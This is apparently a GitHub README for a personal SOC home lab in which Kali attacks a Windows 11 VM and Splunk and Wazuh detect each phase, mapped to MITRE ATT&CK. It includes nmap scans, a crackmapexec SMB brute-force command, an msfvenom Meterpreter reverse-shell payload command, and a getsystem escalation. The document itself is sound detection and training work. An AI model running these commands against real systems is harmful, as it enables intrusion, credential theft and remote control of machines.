# 🛡️ SOC Home Lab Project

<div align="center">

![SOC Lab Banner](https://img.shields.io/badge/SOC-Home%20Lab-blue?style=for-the-badge&logo=shield&logoColor=white)
![Splunk](https://img.shields.io/badge/Splunk-10.4.0-green?style=for-the-badge&logo=splunk&logoColor=white)
![Wazuh](https://img.shields.io/badge/Wazuh-4.14.5-red?style=for-the-badge&logo=wazuh&logoColor=white)
![Metasploit](https://img.shields.io/badge/Metasploit-Latest-darkred?style=for-the-badge)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK-orange?style=for-the-badge)

**Built by [Nithin Nayak V N](https://github.com/YOUR_USERNAME)**

*A fully functional SOC home lab simulating real-world cyber attacks and detecting them using industry-standard SIEM tools*

</div>

---

## 📌 Table of Contents

- [Project Overview](#-project-overview)
- [Lab Architecture](#-lab-architecture)
- [Tools & Technologies](#-tools--technologies)
- [Attack Scenarios](#-attack-scenarios)
- [Detection Coverage](#-detection-coverage)
- [MITRE ATT&CK Coverage](#-mitre-attck-coverage)
- [Project Statistics](#-project-statistics)
- [Project Structure](#-project-structure)
- [Key Findings](#-key-findings)
- [Dashboards](#-dashboards)
- [Incident Reports](#-incident-reports)
- [Skills Demonstrated](#-skills-demonstrated)
- [Author](#-author)

---

## 🎯 Project Overview

This SOC Home Lab project simulates a real-world attack and detection scenario
in an isolated virtual environment. The goal was to:

- 🔴 **Simulate** realistic cyber attacks across multiple phases
- 🔵 **Detect** every attack using Splunk and Wazuh SIEM
- 📋 **Document** findings in professional incident reports
- 🗺️ **Map** all techniques to the MITRE ATT&CK framework

The project covers the **complete attack lifecycle** — from initial
reconnaissance through to full SYSTEM-level compromise — while demonstrating
how a SOC analyst would detect, investigate, and respond to each threat.

### 🏆 Project Highlights

| Metric | Value |
|--------|-------|
| 🎯 Attack Scenarios | 4 Complete Phases |
| 🚨 Total Wazuh Alerts | 659 |
| 📊 Splunk Events Collected | 2,277+ |
| 🗺️ MITRE ATT&CK Tactics | 10 of 14 Covered |
| 🔍 Unique Detection Rules | 25+ |
| 📝 Incident Reports | 4 Professional IRs |
| 🔑 Max Privilege Achieved | NT AUTHORITY\SYSTEM |
| ⚠️ Critical Findings | 7 Security Issues |

---

## 🖥️ Lab Architecture

### Network Topology

```
                    VMware NAT Network: 192.168.128.0/24
                                    │
              ┌─────────────────────┼─────────────────────┐
              │                     │                     │
    ┌─────────▼────────┐  ┌─────────▼────────┐  ┌────────▼─────────┐
    │   Kali Linux     │  │   Windows 11     │  │     Ubuntu       │
    │   (Attacker)     │  │   (Victim)       │  │     (SIEM)       │
    │                  │  │                  │  │                  │
    │ 192.168.128.164  │  │ 192.168.128.162  │  │ 192.168.128.163  │
    │                  │  │                  │  │                  │
    │  🔴 RED TEAM     │  │  🎯 TARGET       │  │  🔵 BLUE TEAM    │
    └──────────────────┘  └──────────────────┘  └──────────────────┘
           │                      │                      │
           │   ◄── attacks ──────►│                      │
           │                      │── logs ─────────────►│
           │                      │   (Sysmon + UF)      │
           │                                             │
           │                               ┌─────────────┴──────┐
           │                               │  Splunk Enterprise  │
           │                               │  Wazuh Manager      │
           │                               │  Detection & Alerts │
           └───────────────────────────────┴────────────────────┘
```

### Machine Specifications

| Machine | OS | IP | Role |
|---------|----|----|------|
| **Kali Linux** | Kali Rolling 2026 | 192.168.128.164 | Attacker / Red Team |
| **Windows 11** | Win 11 Home 24H2 Build 26200 | 192.168.128.162 | Victim / Target (NAYAK_RO) |
| **Ubuntu** | Ubuntu LTS | 192.168.128.163 | SIEM / Blue Team |

**Platform:** VMware Workstation 17 Pro | **Network Type:** NAT

### Log Flow

```
Windows 11 (Sysmon)
       │
       ├──► Splunk Universal Forwarder ──► Splunk Enterprise (port 9997)
       │         index=main
       │         sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational
       │
       └──► Wazuh Agent ──────────────► Wazuh Manager (port 1514)
                                               └──► Detection & MITRE Mapping
```

---

## 🧰 Tools & Technologies

### 🔴 Red Team (Offensive)

| Tool | Purpose |
|------|---------|
| ![Nmap](https://img.shields.io/badge/Nmap-7.99-blue) | Network reconnaissance & port scanning |
| ![CrackMapExec](https://img.shields.io/badge/CrackMapExec-Latest-red) | SMB brute force & credential testing |
| ![Metasploit](https://img.shields.io/badge/Metasploit-Framework-darkred) | Exploitation & post-exploitation |
| ![msfvenom](https://img.shields.io/badge/msfvenom-Payload%20Gen-black) | Malicious payload generation |
| ![Mimikatz](https://img.shields.io/badge/Mimikatz%20(Kiwi)-2.2.0-purple) | Credential access & SYSTEM verification |
| smbclient | SMB file transfer & enumeration |

### 🔵 Blue Team (Defensive)

| Tool | Version | Purpose |
|------|---------|---------|
| ![Splunk](https://img.shields.io/badge/Splunk-Enterprise%2010.4.0-green) | SIEM, log search, dashboards |
| ![Wazuh](https://img.shields.io/badge/Wazuh-Manager%204.x-orange) | Threat detection & MITRE ATT&CK mapping |
| Wazuh Agent | 4.14.5 | Log forwarding from Windows |
| Sysmon | v10.2 | Advanced Windows process/network logging |
| Splunk UF | Latest | Windows log forwarding |

---

## 🔴 Attack Scenarios

### Phase 1 — Network Reconnaissance
> **Severity:** 🟡 Low | **IR:** [IR-001](5-Incident-Reports/reports/IR-001-Nmap-Reconnaissance.md)

Performed host discovery and full port/service scan against the victim machine using Nmap.

```bash
nmap -sn 192.168.128.0/24                           # Host discovery
nmap -sV -sC -O -p- 192.168.128.162                 # Full port scan
nmap -A 192.168.128.162 -oN nmap-aggressive-scan.txt # Aggressive scan
```

**Results:** 6 hosts discovered | 3 open ports (135, 139, 445) | OS fingerprinted as Windows 11 24H2

---

### Phase 2 — SMB Brute Force Attack
> **Severity:** 🔴 High | **IR:** [IR-002](5-Incident-Reports/reports/IR-002-Brute-Force-Attack.md)

Launched a credential brute force attack against the Administrator account over SMB (port 445).

```bash
crackmapexec smb 192.168.128.162 -u administrator -p /tmp/passwords.txt
# Result: [+] Nayak_RO\administrator:2020 (Pwn3d!)
```

**Results:** Credential compromised in 12 attempts | Full admin SMB access gained

---

### Phase 3 — Malware Simulation & Reverse Shell
> **Severity:** 🔴 Critical | **IR:** [IR-003](5-Incident-Reports/reports/IR-003-Malware-Simulation.md)

Generated a Meterpreter reverse TCP payload, delivered it via SMB, and established a C2 connection.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.128.164 LPORT=4444 -f exe -o malware.exe
# Session opened: 192.168.128.164:4444 → 192.168.128.162:57200
```

**Results:** Full Meterpreter session | Process listing | Network enumeration | Shell access

---

### Phase 4 — Privilege Escalation
> **Severity:** 🔴 Critical | **IR:** [IR-004](5-Incident-Reports/reports/IR-004-Privilege-Escalation-COMPLETE.md)

Escalated from standard user to NT AUTHORITY\SYSTEM using Named Pipe Impersonation.

```bash
meterpreter > getsystem
# got system via technique 1 (Named Pipe Impersonation In Memory/Admin)
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```

**Results:** SYSTEM access | 15 persistence vectors found | Backdoor account escalated to Admin

---

## 🔵 Detection Coverage

### Splunk Detections

| Attack | Query | Events Detected |
|--------|-------|----------------|
| Nmap Scan | EventCode=3 + DestinationIp | 57 network connection events |
| Brute Force | EventCode=4625 | 10 failed login events |
| Successful Compromise | EventCode=4624 | 11 successful logons from attacker |
| Malware Execution | EventCode=1 Image=C:\\malware.exe | 6 process creation events |
| Reverse Shell | EventCode=3 DestinationIp=192.168.128.164 | C2 callback captured |
| Privilege Escalation | EventCode=4672 | Special privileges assigned |
| Admin Group Change | EventCode=4732 | User added to administrators |

### Wazuh Detections

| Rule ID | Alert | Level | Phase |
|---------|-------|-------|-------|
| 60204 | Multiple Windows Logon Failures | 10 | Phase 2 |
| 92652 | Successful Remote Logon — Pass-the-Hash | 6 | Phase 2 |
| 92213 | Executable dropped in malware folder | **15** | Phase 3 |
| 61638 | Sysmon — Suspicious dllhost.exe | **12** | Phase 3 |
| 92031 | Discovery activity executed | 3 | Phase 3 |
| 60154 | Administrators Group Changed | **12** | Phase 4 |
| 67028 | Special privileges assigned to new logon | 3 | Phase 4 |
| 60110 | User account changed | 8 | Phase 4 |
| 92043 | Netsh used to add firewall rule | 10 | Phase 4 |

---

## 🗺️ MITRE ATT&CK Coverage

| Tactic | Alerts | Key Techniques |
|--------|--------|---------------|
| 🔺 Privilege Escalation | **148** | T1059.003, T1134.001 |
| ⚙️ Execution | **112** | T1059.003, T1059.001 |
| 🛡️ Defense Evasion | **112** | T1055, T1562 |
| 🔁 Persistence | **75** | T1543.003, T1547 |
| 🔍 Discovery | **49** | T1087, T1070.004 |
| ↔️ Lateral Movement | **15** | T1078.002, T1550.002 |
| 🚪 Initial Access | **14** | T1105, T1078 |
| 📡 Command & Control | **10** | T1021.001, T1071 |
| 💥 Impact | **9** | T1098, T1489 |
| 🔑 Credential Access | **1** | T1110, T1003 |

---

## 📊 Project Statistics

```
╔══════════════════════════════════════════════════════════╗
║              SOC HOME LAB — PROJECT STATS                ║
╠══════════════════════════════════════════════════════════╣
║  Total Wazuh Alerts          │  659                      ║
║  Level 12+ Critical Alerts   │  110                      ║
║  Splunk Sysmon Events        │  2,277+                   ║
║  Failed Login Events         │  10                       ║
║  Successful Logins Detected  │  17                       ║
║  Unique Rules Triggered      │  25+                      ║
║  MITRE Tactics Covered       │  10 / 14                  ║
║  MITRE Techniques Detected   │  15+                      ║
║  Incident Reports            │  4                        ║
║  Persistence Vectors Found   │  15                       ║
║  Max Privilege Achieved      │  NT AUTHORITY\SYSTEM      ║
╚══════════════════════════════════════════════════════════╝
```

---

## 📁 Project Structure

```
SOC-Home-Lab/
│
├── 📄 README.md                        ← You are here
├── 📄 SOC-Project-Report.md            ← Full professional report
├── 📄 .gitignore
│
├── 📁 1-Lab-Setup/
│   ├── LAB-SETUP-GUIDE.md              ← Full lab configuration guide
│   ├── NETWORK-DIAGRAM.md              ← Network topology
│   ├── wazuh-agent-ossec.conf          ← Actual Wazuh agent config
│   └── screenshots/                    ← Lab verification screenshots
│
├── 📁 2-Attacks/
│   ├── nmap-recon/                     ← Phase 1: Nmap scans + results
│   │   └── nmap-aggressive-scan.txt    ← Raw Nmap output file
│   ├── brute-force/                    ← Phase 2: CrackMapExec results
│   │   └── brute-force-results.txt     ← Raw brute force output
│   ├── malware-simulation/             ← Phase 3: Meterpreter evidence
│   └── privilege-escalation/           ← Phase 4: SYSTEM access evidence
│
├── 📁 3-Detection/
│   ├── splunk-queries/                 ← All SPL queries used
│   │   ├── nmap-splunk-queries.spl
│   │   ├── brute-force-splunk-queries.spl
│   │   ├── malware-splunk-queries.spl
│   │   └── privesc-splunk-queries.spl
│   ├── wazuh-rules/                    ← Wazuh alert JSON files
│   │   ├── wazuh-alert-4624-json.txt
│   │   ├── wazuh-discovery-activity-alert.json
│   │   └── wazuh-dllhost-suspicious-process-alert.json
│   └── alerts/                         ← MITRE ATT&CK screenshots
│
├── 📁 4-Dashboards/
│   ├── splunk-dashboards/
│   │   └── soc-dashboard.pdf           ← Splunk attack detection dashboard
│   └── wazuh-dashboards/
│       ├── wazuh-mitre-report.pdf      ← Wazuh MITRE ATT&CK report
│       └── wazuh-it-hygiene-report.pdf ← Wazuh IT hygiene report
│
├── 📁 5-Incident-Reports/
│   ├── templates/
│   │   └── IR-TEMPLATE.md              ← Reusable IR template
│   └── reports/
│       ├── IR-001-Nmap-Reconnaissance.md
│       ├── IR-002-Brute-Force-Attack.md
│       ├── IR-003-Malware-Simulation.md
│       └── IR-004-Privilege-Escalation-COMPLETE.md
│
└── 📁 6-Documentation/
    ├── tools-used/                     ← Tool reference guide
    └── setup-guides/                   ← Step-by-step setup guides
```

---

## 🔍 Key Findings

### 🚨 Critical Security Issues Discovered

> **Finding 1 — Pre-existing Backdoor Account** `CRITICAL`
> A user account named **"hacker"** was found on the victim machine, created
> on 2026-06-13 — 12 days before this exercise. The account was active and
> undetected. The attacker successfully escalated it to Administrators.

> **Finding 2 — Weak Administrator Password** `CRITICAL`
> The built-in Administrator used the password **"2020"** — cracked in just
> 12 brute force attempts from a simple wordlist.

> **Finding 3 — SMB Port 445 Exposed Internally** `HIGH`
> No network segmentation prevented the attacker from directly brute-forcing
> the SMB service from any internal host.

> **Finding 4 — Windows Defender Tamper Protection Disabled** `HIGH`
> Defender real-time monitoring was disabled via PowerShell, allowing malware
> to persist on disk without detection.

> **Finding 5 — SeImpersonatePrivilege Enabled** `HIGH`
> This privilege directly enabled Named Pipe Impersonation escalation to SYSTEM.

> **Finding 6 — 15 Persistence Vectors Available** `HIGH`
> Registry, Startup Folder, Task Scheduler, Services — all exploitable for
> persistence without additional exploits.

> **Finding 7 — No Outbound Port Filtering** `MEDIUM`
> Port 4444 was not blocked, allowing the Meterpreter reverse shell to
> successfully call back to the attacker.

---

## 📊 Dashboards

### Splunk — Attack Detection Dashboard
5-panel dashboard covering:
- Sysmon Events by Type (Bar Chart)
- Total Failed Login Attempts (Single Value)
- Login Attempts by Attacker IP (Table)
- Malware Execution Events (Timeline)
- Full Attack Timeline (Area Chart)

### Wazuh — MITRE ATT&CK Report
- Alerts evolution over time
- Top tactics breakdown (Privilege Escalation: 148)
- Rule level by attack type
- Complete alerts summary (25+ rules)

### Wazuh — IT Hygiene Report
- Agent inventory and system info
- Top running processes
- Network port analysis
- Package inventory

---

## 📋 Incident Reports

| ID | Title | Severity | MITRE Tactics |
|----|-------|----------|--------------|
| [IR-001](5-Incident-Reports/reports/IR-001-Nmap-Reconnaissance.md) | Network Reconnaissance — Nmap Port Scan | 🟡 Low | TA0043 |
| [IR-002](5-Incident-Reports/reports/IR-002-Brute-Force-Attack.md) | SMB Brute Force — Credential Compromise | 🔴 High | TA0006, TA0001 |
| [IR-003](5-Incident-Reports/reports/IR-003-Malware-Simulation.md) | Malware Execution — Meterpreter Reverse Shell | 🔴 Critical | TA0002, TA0011, TA0005 |
| [IR-004](5-Incident-Reports/reports/IR-004-Privilege-Escalation-COMPLETE.md) | Privilege Escalation — SYSTEM + Persistence | 🔴 Critical | TA0004, TA0003 |

---

## 💡 Skills Demonstrated

### Blue Team / SOC Skills
- ✅ SIEM configuration and management (Splunk + Wazuh)
- ✅ Log analysis and threat hunting
- ✅ SPL (Splunk Processing Language) query writing
- ✅ Wazuh rule interpretation and alert triage
- ✅ MITRE ATT&CK framework application
- ✅ Incident report writing in SOC analyst format
- ✅ IOC identification and documentation
- ✅ Dashboard creation for security visibility

### Red Team / Offensive Skills
- ✅ Network reconnaissance (Nmap)
- ✅ SMB enumeration and brute forcing
- ✅ Payload generation (msfvenom)
- ✅ Exploitation and post-exploitation (Metasploit)
- ✅ Privilege escalation (Named Pipe Impersonation)
- ✅ Credential access (Mimikatz/Kiwi)
- ✅ Lateral file transfer via SMB

### Technical Skills
- ✅ VMware virtualization
- ✅ Windows 11 administration and security
- ✅ Linux (Kali, Ubuntu) administration
- ✅ Sysmon deployment and configuration
- ✅ Network architecture (NAT, subnetting)
- ✅ Windows Event Log analysis

---

## ⚙️ How to Reproduce This Lab

### Prerequisites
- VMware Workstation Pro 17+
- 16GB+ RAM (6GB Kali + 6GB Windows + 4GB Ubuntu)
- 150GB+ disk space

### Quick Setup
1. Create 3 VMs on NAT network (192.168.128.0/24)
2. Install Sysmon on Windows with SwiftOnSecurity config
3. Install Splunk Enterprise on Ubuntu (port 8000)
4. Install Wazuh Manager on Ubuntu (port 443)
5. Install Splunk UF + Wazuh Agent on Windows
6. Verify logs flowing to both SIEMs
7. Follow attack phases in `2-Attacks/` folder

Full setup guide: [6-Documentation/setup-guides/](6-Documentation/setup-guides/)

---

## 👨‍💻 Author

<div align="center">

### Nithin Nayak V N

*Aspiring SOC Analyst | Cybersecurity Enthusiast*

[![GitHub](https://img.shields.io/badge/GitHub-Profile-black?style=for-the-badge&logo=github)](https://github.com/TechExpert99)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?style=for-the-badge&logo=linkedin)](https://linkedin.com/in/nithin-nayak-v-n-99b63625a)

</div>

---

<div align="center">

**⭐ If this project helped you, please give it a star!**

*All attacks were performed in an isolated lab environment on personally owned virtual machines for educational purposes only.*

![Visitor Count](https://visitor-badge.laobi.icu/badge?page_id=TechExpert99.SOC-Home-Lab)

</div>
